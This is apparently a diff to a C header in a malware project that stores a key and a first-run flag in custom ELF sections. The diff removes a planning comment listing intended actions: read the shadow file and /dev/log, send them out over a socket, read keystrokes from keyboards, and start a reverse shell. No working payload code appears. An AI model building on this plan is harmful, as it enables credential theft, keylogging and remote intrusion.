@@ -28,17 +28,16 @@
         size -d -A --radix=16 [binary]
     to get ELF_CODE's section size.
 
-    Warning: If the binary is packed with UPX,
+    Warning: If the binary is packed,
     there will be no sections left.
 */
 #define ELF_FUNC_SIZE (0x774)
 
 #include "setup.h"
-
 __attribute((section(ELF_BOOL))) static bool is_first_time = true;
 __attribute((section(ELF_KEY))) static char key[ELF_FUNC_SIZE] = {0};
 
-#define ELF_NAMELEN (1024)
+#define ELF_NAMELEN (512)
 
 typedef struct bin_s {
     char name[ELF_NAMELEN];
@@ -51,17 +50,6 @@ typedef struct utl_s {
     int s_len;
     elf_bin_t bin;
 } elf_utils_t;
-
-/*
-    1. Look for important files and send their content through socket
-        -> read shadow file
-        -> /dev/log
-        -> Get keyboard alignment ?
-    2. Find keyboard you can read from
-        -> in a child, loop through keyboards and send newfound status
-            -> assume qwerty except if you have another alignment
-    3. start revshell
-*/
 
 // elf.c
 elf_utils_t *elf_read(char const *);
